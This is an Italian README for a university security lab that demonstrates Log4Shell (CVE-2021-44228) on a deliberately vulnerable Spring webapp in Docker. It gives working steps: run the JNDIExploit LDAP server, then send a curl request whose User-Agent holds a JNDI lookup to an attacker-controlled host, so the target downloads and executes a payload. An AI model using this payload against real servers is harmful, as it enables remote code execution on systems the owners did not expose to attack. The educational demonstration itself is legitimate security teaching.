# Progetto sicurezza Informatica ICDA A.A 2021-2022

Lo scopo di questo progetto è quello di mostrare la vulnerabilità Log4shell CVE-2021-44228 che affligge la libreria Java Log4j , impiegata da innumerevoli software di ogni tempo (programmi standard, giochi, webapp).

In questo progetto è stata scelta una webapp spring (popolare web framework Java MVC), opportunamente modificata per lo scopo.

La parte da me modificata si trova nel controller "HomeController", file "HomeController.java"

La libreria impiegata di log4J 2.6.1.
Nel progetto è presente il file pom.xml per la compilazione tramite Maven.
Ho creato un DockerFile che contiene al suo interno tutto il necessario per avviare l'immagine senza alcuna configurazione e senza installare la JDK necessaria per dimostrare l'exploit.

## Usage
Prima di tutto sarà necessario avviare un server mysql e impostare il relativo indirizzo, username e password nel file "application.properties", all'interno della cartella "resources". è possibile utilizzare un container docker allo scopo.

Successivamente sarà necessario avviare il server LDAP che servirà la classe Java con il Payload.


```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i tuo-indirizzo-ip-privato -p 8888
```



Per sfruttare la vulnerabilità è necessario  creare un payload (un comando che si vuole far eseguire al server remoto). Esempio:

```bash
touch /tmp/hacked
```

e includerlo (codificato in base64) in una richiesta da inviare al server della webApp. Si userà il comando Curl per lo scopo.

Una volta inviato il comando, il metodo della libreria Log4j interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server LDAP (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:

```bash
curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQ=}' http://172.18.0.2:8080
```

## Avvio web-app

```bash
docker run --name nomeApplicazione -p 8080:8080 --network nomeRete
```




Successivamente sarà possibile notare dai log del server LDAP che è stata servita la classe Java al server della webapp, con il relativo payload.
A seconda del comando eseguito, è possibile vedere il risultato. Ad esempio, se il payload provoca la creazione di file, è possibile entrare nel container e verificarlo. Ad esempio:


```bash
docker exec -it nomeApplicazione sh
```

```bash
ls /tmp/hacked
```





```

## Contributing
La webApp impiegata in questo progetto è stata creata dall'autore GNico (github: https://github.com/GNico/spring-eshop )


Il server LDAP è stato creato da feihong-cs.


La libreria Log4J è di Apache Software foundation https://logging.apache.org/log4j/2.x/index.html



## License
[MIT](https://choosealicense.com/licenses/mit/)